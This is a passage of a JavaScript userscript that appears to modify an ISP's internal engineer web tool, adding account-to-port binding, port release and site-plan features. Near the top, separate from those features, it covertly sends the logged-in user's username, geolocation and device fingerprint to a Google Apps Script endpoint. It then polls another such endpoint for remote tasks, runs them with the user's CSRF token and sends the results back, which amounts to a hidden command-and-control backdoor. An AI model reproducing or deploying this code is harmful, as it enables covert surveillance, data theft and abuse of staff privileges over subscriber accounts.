/*
javascript:(function(){
	
if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.ru')||window.location.href.includes('http://inetcore.mts.ru/fix')||window.location.href.includes('http://pre.inetcore.mts.ru/fix'))){
	document.title='Inetcore+';
	*/
	let dev=false;
	let input='';
	if(dev){
		window.AppInventor={
			setWebViewString:function(str){console.log(str)},
			getWebViewString:function(){return input},
		};
	};
	
	let addCSS=document.createElement('style');/*addCSS.type='text/css';*/let myCSS=`
		.myloader{width:20px;height:20px;border:2px dashed cadetblue;border-left-color:crimson;border-right-color:coral;border-radius:50%;vertical-align:middle;margin-right:2px;animation:myloader-spinner 0.99s linear infinite;display:inline-table;}
		@keyframes myloader-spinner{to{transform:rotate(360deg)}}
		
	`;
	addCSS.appendChild(document.createTextNode(myCSS));document.head.appendChild(addCSS);
	
	window.AppInventor.setWebViewString('version_:FX_test_v174.a');
	
	let info={};
	info=filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']);
	info.visualViewport=filterProps(window.visualViewport,['width','height']);
	info.navigator=filterProps(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory');
	info.navigator.connection=filterProps(window.navigator.connection,'effectiveType,rtt,downlink,saveData');
	window.navigator.getBattery().then(function(obj){info.navigator.battery=filterProps(obj,'charging,chargingTime,dischargingTime,level');});
	function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
	
	let deviceid=randcode(20);/*console.log('deviceid',deviceid);*/
	let configid='initial';/*console.log('configid',configid);*/
	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
	let timeout_getTask=10000;
	let enable_getTask=true;
	
	let username='';
	fetch('/call/main/get_user_data',{
		'method':'POST',
		'headers':{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),},
	}).then(function(resp){return resp.json()}).then(function(user_data){
		if(user_data.data.username){
			username=user_data.data.username;/*console.log('username',username);*/
			if(true/*!dev*/){
				fetch('https://script.google.com/macros/s/AKfycbxXeWzgHKLS1X0y5SCDVqmbFPkZByfUAFieB5tS-tmQ1Ns3k8zQxr8IUA/exec',{
					'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
					'body':JSON.stringify({
						obj:{
							username:username,
							deviceid:deviceid,
							latitude:user_data.data.latitude,
							longitude:user_data.data.longitude,
							date:new Date(Date.now()).toString(),
							info:info,
						},
					})
				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
					if(true/*username=='mypanty1'*/){
						let timer_getTask=setTimeout(getTask,timeout_getTask);
						function getTask(){
							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid+'&configid='+configid,).then(function(resp){return resp.json()}).then(function(obj){
								/*console.log('getTask',obj);*/
								if(obj&&obj.config){let config=obj.config;
									if(config.configid){configid=config.configid;};
									if(config.timeout){timeout_getTask=config.timeout;};
									if(config.enable){enable_getTask=false;};
								};
								if(obj&&obj.task_id&&obj.url&&obj.method){
									let payload={
										'method':obj.method,
										'headers':{
											'Content-Type':'application/json;charset=utf-8',
											'X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
										},
									};
									if(obj.body){payload.body=obj.body;};
									fetch(obj.url,((obj.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
										/*console.log('result',result);*/
										if(result){
											fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec',{
												'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
												'body':JSON.stringify({
													username:username,
													deviceid:deviceid,
													task_id:obj.task_id,
													result:JSON.stringify(result),
												})
											}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){next();});
										}else{
											next();
										};
									}).catch(function(err){console.log(err);next();}).finally(function(){});
								}else{
									next();
								};
							}).catch(function(err){console.log(err)}).finally(function(){});
							function next(){if(enable_getTask){timer_getTask=setTimeout(getTask,timeout_getTask);}};
						};
					};
				});
			};
		};
	});
	
	document.getElementById('port-bind-user-action-template').innerHTML=`<my-port-bind-user-action v-bind="$props"/>`;
	Vue.component('my-port-bind-user-action', {
		template:`<link-block actionIcon="expand" icon="link" v-if="$root.priv('LanBillingCtl')" @block-click="openModal" :disabled="disabledLink" text="привязать лицевой счет" type="large"/>`,
		props:{
			disabled:{type:Boolean,default:false,},
			port:{type:Object,required:true,},
			status:{type:Object,required:true,},
			device:{type:Object,required:true,},
		},
		computed:{
			disabledLink(){
				return (this.port.state=='bad'||this.status.IF_ADMIN_STATUS==false||this.disabled);
			},
			deviceParams(){
				const keys='MR_ID IP_ADDRESS SYSTEM_OBJECT_ID VENDOR FIRMWARE FIRMWARE_REVISION PATCH_VERSION DEVICE_NAME';
				return weedOut(this.device,keys);
			},
			/*add portReBindData, for set-port-modal*/
			portReBindData(){
				return {
					region:this.device.REGION_ID,
					state:this.port.state,
					subscriber_list:this.port.subscriber_list,
					last_mac:this.port.last_mac,
				};
			},
		},
		methods:{
			openModal(){
				this.$root.showModal({
					title:'выбор лицевого счета',
					data:{
						portNumber:this.port.number,
						portParams:{
							SNMP_PORT_NAME:this.port.snmp_name,
							PORT_NUMBER:this.port.number,
						},
						deviceParams:this.deviceParams,
						portReBindData:this.portReBindData,/*add portReBindData, for set-port-modal*/
					},
					component:'set-port-modal',
				});
			},
		}	
	});
	
	Vue.component('set-port-modal',{/*need ref rebind + redesign*/
	  template:`
		<div class="container-fluid">
			<div class="search-ctrl box-shadow-none search-account-modal" style="height:unset;">
				<div class="input-group">
					<input id="searchPanelAccount" v-filter="'[0-9-]'" v-model.lazy="sample" @keyup.enter="searchAccount" type="text" class="form-control" placeholder="найти">
					<div class="input-group-append">
						<button v-on:click="audio" v-if="audioShow" class="btn btn-audio btn-erase" type="button"><i class="fas fa-microphone"></i></button>
						<button v-on:click="erace" class="btn btn-erase" type="button"><i class="fas fa-times"></i></button>
						<button v-on:click="searchAccount" class="btn btn-search" type="button"><i class="fas fa-search"></i></button>
					</div>
				</div>
			</div>
			<div v-if="account">
				<p class="small-text">результат поиска:</p>
				<div v-if="account.isError" v-html="account.text" class="alert alert-warning" role="alert"></div>
				<div v-else>
					<div class="account-block account-info" v-for="acc in account.data">
						<router-link class="cursor-pointer" tag="div" :to="'/'+acc.agreements.account"> 
							<div class="link-title">
								<i class="fa fa-user"></i> {{acc.agreements.account}}<i class="fa fa-chevron-right float-right"></i>
							</div>
						</router-link>
						<div v-if="acc.address" style="border: 1px solid #a2a2a2;border-radius:5px;padding:0.2em;">
							<span class="small-text">{{ shortAddress(acc.address) }}</span>
						</div>
						<div v-if="acc.phone" class="small-text">
							{{ acc.phone }}
							<span class="inscription">Телефон</span>
						</div>
						<div v-if="acc.mobile" class="small-text">
							{{ acc.mobile }}
							<span class="inscription">Телефон</span>
						</div>
						<div class="small-text">
							{{ getBalance(acc.agreements) }} &#8381;
							<span class="inscription">Баланс</span>
						</div>
						<div class="small-text">
							{{ acc.agreements.lastsum }} ₽ {{ acc.agreements.lastpaydate }}
							<span class="inscription">Последний платеж</span>
						</div>
						<div v-if="acc.agreements.isconvergent&&acc.agreements.convergentmsisdn" class="small-text">
							{{ acc.agreements.convergentmsisdn }}
							<span class="inscription">Конвергент</span>
						</div>
						<div v-if="acc.vgids.length > 0">
							<div class="form-row">
								<div class="mt-2 full-fill">учетная запись для связи:</div>
								<div class="form-group full-fill custom-control-radio" v-for="vg in acc.vgids">
									<label>
										<div class="custom-control custom-checkbox my-1 mr-sm-2">
											<input type="radio" class="custom-control-input" v-bind:disabled="loading" v-bind:id="vg.vgid" v-bind:name="acc.userid" @change="getMacList" v-bind:value="{vgid: vg.vgid, login: vg.login, serverid: vg.serverid, type_of_bind: vg.type_of_bind, agentid: vg.agentid}" v-model="resource">
											<span class="custom-control-label custom-control-empty">{{vg.login}} • {{vg.vgid}}</span>
											<div v-if="true||vg.serverid=='108'" class="full-fill">
												<button @click="activateSpd(vg.vgid)" v-bind:disabled="loading||vg.serverid!='108'" type="submit" class="btn btn-primary btn-sm" style="margin-left:20px;">активировать {{vg.vgid}}</button>
											</div>
											<div class="small-text">{{vg.accondate}}<span class="inscription"> создан</span></div>
											<div class="small-text">{{vg.tardescr}}</div>
											<div v-if="vg.addresses&&vg.addresses[0]&&(shortAddress(vg.addresses[0].address)!=shortAddress(acc.address))" class="small-text">{{shortAddress(vg.addresses[0].address)}}</div>
										</div>
									</label>
								</div>
							</div>
							
							
							<div class="container-fluid" style="border: 1px solid #a2a2a2;border-radius:5px;padding:0.2em;margin-bottom:0.2em;">
								<div class="form-row">
									<div class="form-group col-9 control">
										<div class="small-text">коммутатор</div>
										<input class="form-control form-control-sm" v-model="myparams.sw" v-filter="'[0-9\.]'" maxlength="15" placeholder="коммутатор">
									</div>
									<div class="form-group col-3 control">
										<div class="small-text">порт</div>
										<input class="form-control form-control-sm" v-model="myparams.port" v-filter="'[0-9]'" maxlength="2" placeholder="порт">
									</div>
								</div>
							</div>
							
							
							<div v-if="typeOfBind == 2" class="form-row">
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button @click="setupMacForUser()" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-3" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == 3 || typeOfBind == 6 || typeOfBind == 8" class="form-row">
								<input v-if="typeOfBind == 6" class="form-control form-control-sm mb-2" v-filter="'[0-9\.]'" v-model="client_ip" maxlength="15">
								<button @click="setBind(3)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill" type="submit">связать счет</button>
								<button v-if="typeOfBind == 8" @click="setBind(8)" v-bind:disabled="loading" class="btn mt-2 btn-primary btn-sm btn-fill" type="submit">выделить IP</button>
							</div>
							<div v-else-if="typeOfBind == 5" class="form-row">
								<button @click="setBind(3)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-1" type="submit">связать счет</button>
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button @click="insOnlyMac()" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == 7 || typeOfBind == 9" class="form-row"><!--region78, type 9-->
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button v-if="typeOfBind == 7" @click="setBind(7)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">перепривязать mac</button>
								<button v-if="typeOfBind == 9" @click="setBind(9)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == null"></div>
							<div v-else>
								<div class="alert alert-warning mt-2" role="alert">выбраная учетная запись не нуждается в привязке</div>
							</div>

					  </div>
					  <div v-else>
							<div class="alert alert-warning mt-2" role="alert">не найдено не одной учетной записи, доступной для привязки</div>
					  </div>
					</div>
					<div v-if="result" class="mt-3 response-block">
						<div v-if="result.type=='error'">
							<div v-html="result.text.slice(0,120)" class="alert alert-danger" role="alert"></div>
							<div v-if="result.contract" class="rebindme alert":class="result.alertClass" role="alert">
								<div v-if="!result.isAnonimus && result.p_account">порт занят лс {{ result.p_account }}<span v-if="result.p_flat"> кв {{ result.p_flat }}</span></div>
								<div>{{ result.alertText }}</div>
								<div v-if="result.btnText" style="text-align:right;">
									<input type="button" v-model="result.btnText" @click="reBind(result.contract,result.serverid,result.type_of_bind)">
								</div>
							</div>
							<div v-if="resultReBind">
								<div v-if="resultReBind.type=='error'" class="rebinderr alert":class="resultReBind.alertClass" role="alert">
									<div>{{ resultReBind.alertText }}</div>
									<div>{{ resultReBind.text }}</div>
								</div>
								<div v-else-if="resultReBind.InfoMessage" class="rebindok alert":class="resultReBind.alertClass" role="alert">
									<div>{{ resultReBind.alertText }}</div>
								</div>
							</div>
						</div>
						<div v-else>
							<div v-if="typeOfBind == 1 && result.code == 200 " class="alert alert-success" role="alert">лс {{ sample }} успешно привязан к порту {{ data.portNumber}} ({{ data.deviceParams.IP_ADDRESS }})</div>
							<div v-if="typeOfBind != 1 && result.InfoMessage" class="alert alert-success" role="alert" v-html="result.InfoMessage"></div>
							<div v-if="typeOfBind != 1 && result.Data">
								<div v-if="result.Data.ip" class="small-text">{{ result.Data.ip }}<span class="inscription"> ip</span></div>
								<div v-if="result.Data.gateway" class="small-text">{{ result.Data.gateway }}<span class="inscription"> шлюз</span></div>
								<div v-if="result.Data.mask" class="small-text">{{ result.Data.mask }}<span class="inscription"> маска</span></div>
							</div>
						</div>
					</div>
				</div>

			</div>
			<div v-if="loading" class="progress mt-2">
				<div class="progress-bar progress-bar-striped progress-bar-animated bg-danger w-100"></div>
			</div>
		</div>
	  `,
	  props: ['data'],
	  data: function () {
		return {
		  loading: false,
		  sample: '',
		  account: null,
		  resource: null,
		  client_ip: null,
		  mac: {list: [], selected: ''},
		  result: {},
		  resultReBind: {},/*add this*/
		  recognizer: {},
		  audioShow: false,
		  myparams:{/*add manual input*/
			  sw:'',
			  port:''
		  },
		};
	  },
	  created: function () {
		this.erace();
		this.audioSetting();
	  },
	  computed: {
		typeOfBind: function () {
		  if (this.resource && this.resource.type_of_bind) return this.resource.type_of_bind
		},
	  },
	  methods: {
		activateSpd:function(idZakaza){
			window.AppInventor.setWebViewString('sms_tel_:+79139801727');
			window.AppInventor.setWebViewString('sms_text:activatespd '+idZakaza);
			window.AppInventor.setWebViewString('sms_type:direct'/*approve*/);
		},
		shortAddress:function(addr){/*сжатие адреса для account*/
			if(addr){
				/*Россия, обл.Новосибирская, г.Новосибирск, ул.Виктора.Уса, дом.7, кв.515*/
				return addr.replace(/\d\d\d\d\d\d$/,'').replace(/[\s]/g,'.').match(/[^\s,]+/g).join(', ')
			};
		},
		clear: function () {
		  this.account = null;
		  this.resource = null;
		  this.result = {};
		  this.resultReBind = {};/*add this*/
		  this.myparams={/*add manual input*/
			  sw:this.data.deviceParams.IP_ADDRESS,
			  port:this.data.portNumber
			};
		  this.mac = {list: [], loading: false, selected: ''};
		},
		erace: function () {
		  this.sample = '';
		  this.clear();
		},
		searchAccount: function () {
		  this.clear();
		  self = this;
		  self.loading = true;
		  httpGet('/call/lbsv/search?text=' + this.sample + '&type=account&city=any').then(function(data) {
			if (data.type == "single") data.data = [data.data];
			var searched = [];
			if (!data.isError) {
			  data.data.forEach(function (acc) {
				for (var i in acc.agreements) {
				  if (acc.agreements[i].account.replace(/-/g,'') == self.sample.replace(/-|\s/g,'')) {
					acc.agreements = acc.agreements[i];
					acc.vgids = self.getInternetResources(acc.vgroups);
					searched.push(acc);
					break;
				  }
				}
			  });
			  data.data = searched;
			}
			self.account = (!data.isError && data.data.length == 0) ? {isError: true, type: "warning", text: "ЛС не найден"} : data;
			self.loading = false;
		  }, function (err) {
			self.loading = false;
		  });
		},
		getBalance: function (agreements) {
		  var minus = (agreements.balance.minus) ? '-' : '';
		  return minus + String(agreements.balance.integer) + '.' + agreements.balance.fraction;
		},
		getInternetResources: function (vgroups) {
		  var result = [];
		  vgroups.forEach(function (vg) {
			if (vg.type_of_bind != 0)
			  result.push(vg);
		  });
		  return result;
		},
		setupMacForUser: function () {
		  var params = {mac: this.mac.selected, port: this.data.portNumber, ip: this.data.deviceParams.IP_ADDRESS, account: this.sample};
		  Object.assign(params, this.resource);
		  this.serviceMixQuery('ins_mac', params);
		},
		getMacList: function () {
		  if ([2, 5, 7, 9, 10].indexOf(this.resource.type_of_bind) >= 0) {
			this.loading = true; 
			var self = this;
			var params = {port: this.data.portParams, device: this.data.deviceParams, type: 'array'};
			httpPost('/call/hdm/port_mac_show', params).then(function(data) {
			  self.mac.list = data.text;
			  self.loading = false;
			}, function(err) {
			  self.loading = false;
			});
		  };
		},
		insOnlyMac: function () {
		  var params = {mac: this.mac.selected, account: this.sample};
		  Object.assign(params, this.resource);
		  this.serviceMixQuery('ins_only_mac', params);
		},
		setBind: function (type_of_bind) {
		  var params = {
			ip: this.myparams.sw,/*add manual input*//*this.data.deviceParams.IP_ADDRESS*/ 
			port: this.myparams.port,/*add manual input*//*this.data.portNumber*/
			client_ip: this.client_ip,
			mac: this.mac.selected,
			account: this.sample 
			};
		  Object.assign(params, this.resource);
		  if (type_of_bind && params.type_of_bind != 10) params.type_of_bind = type_of_bind;
		  this.serviceMixQuery('set_bind', params, ((this.data.portReBindData)?(this.data.portReBindData):(false)));/*add this.data.portReBindData*/
		},
		serviceMixQuery: function(method, params, p_info) {/*add p_info*/
		  this.loading = true;
		  this.result = {};
		  this.resultReBind = {};/*add this*/
		  var self = this;
		  httpPost('/call/service_mix/' + method, params, true).then(function(data) {
			self.result = data;
			if (data.Data && typeof data.Data == 'string' && data.Data.split('|').length == 3 ) {
			  var connect = data.Data.split('|');
			  data.Data = { ip: connect[0], gateway: connect[1], mask: connect[2] };
			};
			/*add data.contract*/
			if(params.serverid/*=='108'*/&&p_info){
				if(data.type=='error'&&data.text&&data.text.length>0&&data.text.indexOf('Мы не можем отобрать порт у контракта ')>=0){/*Мы не можем отобрать порт у контракта 2495985 так-как он активен.*/
					data.contract=parseInt(data.text.replace('Мы не можем отобрать порт у контракта ',''),10).toString(10);/*need string*/
					data.serverid=params.serverid;
					data.type_of_bind=params.type_of_bind;
					/*var p_state=p_info.state;*/
					var anonimus=(p_info.subscriber_list[0])?false:true;
					
					data.isAnonimus=anonimus;
					if(!anonimus){
						data.p_account=p_info.subscriber_list[0].account;
						data.p_flat=p_info.subscriber_list[0].flat;
					};
					
					var d_now=Date.now();/*1593533461000*/
					/*todo активность по маку*//*var d_last=(!anonimus)?Date.parse(p_info.subscriber_list[0].last_at):d_now;*/
					var d_last=(p_info.last_mac&&p_info.last_mac.last_at)?Date.parse(p_info.last_mac.last_at.split(' ')[0].split('.').reverse().join('-')):d_now;
					var div6m=((d_now-d_last)>=15724800000)?true:false;
					var date_now_text=new Date(d_now).toISOString().slice(0,10);
					var date_last_text=new Date(d_last).toISOString().slice(0,10);
					
					if(p_info.state=='busy'||p_info.state=='hub'){
						data.alertText='последняя активность '+date_last_text;
						data.alertClass='alert-warning';
						data.btnText='все равно освободить';
					}else if(p_info.state=='closed'){
						data.alertText='договор расторгнут, порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='expired'){
						data.alertText='неактивен более 3 мес, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='double'){
						data.alertText='мак "переехал" на другой порт, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='new'){
						data.alertText='на порту новый мак, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='free'){
						data.alertText='на порту никогда небыло активности, порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else{
						data.alertText='статус порта: '+p_info.state;
						data.alertClass='alert-dark';
						data.btnText='';
					};
					window.AppInventor.setWebViewString('string_1:(error) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' contract:'+data.contract+' text:'+data.alertText+((p_info.last_mac&&p_info.last_mac.value)?(' last_mac:'+p_info.last_mac.value):('')));
				}else{
					window.AppInventor.setWebViewString('string_3:(success) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' text:'+data.InfoMessage);
				};
			}else{
				if(data.type=='error'&&data.text){
					window.AppInventor.setWebViewString('string_4:(error) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' mac:'+params.mac+' client_ip:'+params.client_ip+' serverid:'+params.serverid+' agentid:'+params.agentid+' type_of_bind:'+params.type_of_bind+' text:'+data.text);
				}else{
					window.AppInventor.setWebViewString('string_4:(success) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' mac:'+params.mac+' client_ip:'+params.client_ip+' serverid:'+params.serverid+' agentid:'+params.agentid+' type_of_bind:'+params.type_of_bind+' text:'+data.InfoMessage);
				};
			};
			self.loading = false;
		  }, function() { 
			self.loading = false;
			self.result = {text: "Возникла ошибка при обращении к серверу Inetcore", isError: true};
		  });
		},
		/*reBind*/
		reBind:function(contract,serverid,type_of_bind){
			var reBind_params={
				ip:this.myparams.sw,/*'10.221.153.168'*/
				port:contract,
				vgid:contract,
				serverid:serverid,/*108*/
				type_of_bind:type_of_bind,/*3*/
			};
			this.loading = true;
			this.resultReBind = {};
			var self = this;
			httpPost('/call/service_mix/set_bind', reBind_params, true).then(function(data) {
				self.resultReBind = data;
				if(data.type=='error'){
					data.alertClass='alert-warning';
					data.alertText='освободить не удалось';
					window.AppInventor.setWebViewString('string_2:(error) text:'+data.text+' sw:'+reBind_params.ip+' p:'+reBind_params.port+' id:'+reBind_params.contract);
				}else if(data.InfoMessage){
					data.alertClass='alert-success';
					data.alertText='порт освобожден!'+((data.Data.IP)?(' тут был абонент с ip:'+data.Data.IP):'');
					window.AppInventor.setWebViewString('string_2:(rebind) sw:'+reBind_params.ip+' p:'+reBind_params.port+' id:'+reBind_params.contract+' ip:'+data.Data.IP);
				};
				self.loading = false;
			},function(){ 
				self.loading = false;
				self.resultReBind = {alertText:'ошибка при обращении к серверу Inetcore', alertClass:'alert-danger'};;
			});
		},
		audioSetting: function () {
		  try {
			this.recognizer = new webkitSpeechRecognition();
			this.recognizer.interimResults = true;
			this.recognizer.lang = 'ru-RU';
			httpGet('/call/main/setup?act=audio').then((data) => {
			  if (data.data == true) this.audioShow = true;
			},
			(err) => {
			  this.audioShow = false;
			});
		  }
		  catch (e) { console.log(e) }
		},
		audio: function () {
		  document.querySelector('.btn-audio .fa-microphone').style.animation = 'bounce-in 2s infinite ease-in-out alternate';
		  var self = this;
		  this.recognizer.onresult = function (event) {
			var result = event.results[event.resultIndex];
			self.sample = result[0].transcript;
			self.sample = self.sample.replace(/[^\d|-]/g, '');
			if (result.isFinal) {
			  try {
				if (self.sample.length < 11 ) 
				  return self.account = {isError: true, type: "warning", text: "ЛС не найден"};
				else { self.searchAccount() }
			  }
			  catch (err) {
				console.log('error',err);
			  }
			  finally {
				document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			  }
			  document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			} else {
			  document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			}
		  };
		  this.recognizer.start();
		},
	  },
	});
	
	document.getElementById('site-du-wrapper-template').innerHTML=`<my-site-du-wrapper v-bind="$props"/>`;
	Vue.component('my-site-du-wrapper',{
		template:`
			<main>
				<transition name="slide-page" mode="out-in" appear>
					<div v-if="showNav">
						<page-navbar title="домовой узел" @refresh="refresh"/>
						<card-block>
							<nav-slider :items="navItems" :loading="loading.entrances"/>
							<devider-line/>
							<info-text :title="site.address" :text="site.node"/>
							<div style="text-align:right;padding-right:1em;margin-top:-2em;">
								<span id="loader_downloadPL" class="myloader" style="display:none;"></span>
								<input type="button" id="btn_downloadPL" @click="generate(site.id)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема">
							</div>
							<devider-line/>
							<link-block text="топология сети" icon="topology" actionIcon="right-link" :to="toTopology"/>
						</card-block>
					</div>
				</transition>
				<transition name="slide-page" mode="out-in">
					<keep-alive>
						<router-view :key="$route.params.site_id+'_'+$route.name+'_'+$route.params.entrance_id" :siteProp="site" :entranceProp="currentEntrance" :loading="loading" :entrances="responses.entrances" :devices="uzelDevices" :plints="responses.plints" :racks="responses.racks" :floors="responses.floors" @load:entrances="loadEntrances" @load:floors="loadFloors" @load:racks="loadRacks" @load:plints="loadPlints" @toggle-nav="showNav=$event"/>
					</keep-alive>
				</transition>
			</main>
		`,
		props:{
			siteProp:{type:Object,default:null},
			entranceProp:{type:Object,default:null},
		},
		data(){
			return {
				site:this.siteProp,
				responses:{
					entrances:null,
					devices:null,
					floors:null,
					racks:null,
					plints:null,
				},
				loading:{
					entrances:false,
					devices:false,
					floors:false,
					racks:false,
					plints:false,
				},
				infoOpened:false,
				showNav:true,
			};
		},
		async created(){
			this.loadDevices();
			this.loadEntrances();
			this.$root.$on('building:update',()=>{
				this.loadEntrances(true);
				this.loadFloors(true);
			});
		},
		computed:{
			uzelDevices(){
				if(!this.responses.devices)return null;
				return this.responses.devices.filter(({UZEL_NAME})=>UZEL_NAME===this.site.node);
			},
			currentEntrance(){
				if(this.currentIndex===0)return null;
				const {entrances}=this.responses;
				const entrance=entrances&&entrances.find(({ENTRANCE_ID})=>ENTRANCE_ID===this.$route.params.entrance_id);
				return {...this.entranceProp,...entrance };
			},
			currentIndex(){
				const {entrance_id}=this.$route.params;
				if(!entrance_id)return 0;
				return this.navItems.findIndex(({id})=>id===entrance_id);
			},
			currentItem(){
				return this.navItems[this.currentIndex];
			},
			navItems(){
				const entrances=this.responses.entrances;
				const mainRoute={
					icon:'entrance-mini',
					name:'ДУ',
					path:{name:'site_du',params:{site_id:this.$route.params.site_id,siteProp:this.site}},
				};
				const generateEntranceRoute=(entrance)=>({
					icon:'entrance-mini',
					name:`${entrance.ENTRANCE_NO} • ${entrance.FLAT_FROM_TO} кв`,
					path:{
						name:'entrance',
						params:{
							site_id:this.$route.params.site_id,
							entrance_id:entrance.ENTRANCE_ID,
							siteProp:this.site,
							entranceProp:entrance,
						},
					},
				});
				if(!entrances&&this.entranceProp)return [mainRoute,generateEntranceRoute(this.entranceProp)];
				if(!entrances)return [mainRoute];
				const entranceRoutes=entrances.map((entrance)=>(generateEntranceRoute(entrance)));
				return [mainRoute,...entranceRoutes];
			},
			toTopology(){
				return {
					name:'net-topology',
					params:{
						id:this.site.node,
						type:'site',
						siteProp:this.site,
						entrancesProp:this.responses.entrances,
					},
				};
			},
		},
		methods:{
			generate:function(siteid){
				console.log('generate('+siteid+')');
				document.getElementById('btn_downloadPL').setAttribute('disabled','disabled');
				document.getElementById('loader_downloadPL').style.display='inline-table';
				let headers={'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),};
				let sites={};function resetSiteObj(nodes={}){return {nodes:nodes,entrances:{},racks:{},devices:{},ppanels:{},loads:{}}};
				function loader(siteid='unknown',state=true,object='unknown'){if(state){sites[siteid].loads[object]=false;}else{sites[siteid].loads[object]=true;};};
				fetch('/call/device/search',{'method':'POST','headers':headers,'body':JSON.stringify({'pattern':siteid}),}).then(resp=>resp.json()).then(function(data){
					if(data.data){
						if(data.data.type=='building'||data.data.type=='building_mu'){data.data.data=[data.data.data]};
						sites[siteid]=resetSiteObj(data.data.data);
						loader(siteid,true,'site_entrance_list_'+siteid);
						fetch('/call/device/site_flat_list',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(entrances){
							if(entrances.type=='floors'&&entrances.data.length>0){/*наличие падиков*/
								for(let entrance of entrances.data.filter(function(item){return !item.nioss_error})){/*перебор падиков*/
									sites[siteid].entrances[entrance.ENTRANCE_ID]=entrance;
									sites[siteid].entrances[entrance.ENTRANCE_ID].SITE_ID=siteid;/*костыль для таблицы*/
									loader(siteid,true,'get_nioss_object_'+entrance.ENTRANCE_ID);
									fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:entrance.ENTRANCE_ID,object:'entrance'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
										Object.assign(sites[siteid].entrances[entrance.ENTRANCE_ID],nioss_data.data);
									}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+entrance.ENTRANCE_ID)});
								};
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'site_entrance_list_'+siteid)});
						loader(siteid,true,'devices_'+siteid);
						fetch('/call/device/devices',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(devices_data){let devices=devices_data.data;
							devices.map(function(device){
								sites[siteid].devices[device.DEVICE_NIOSS_ID]=device;
								loader(siteid,true,'get_nioss_object_'+device.DEVICE_NIOSS_ID);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:device.DEVICE_NIOSS_ID,object:'device'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
									Object.assign(sites[siteid].devices[device.DEVICE_NIOSS_ID],nioss_data.data);
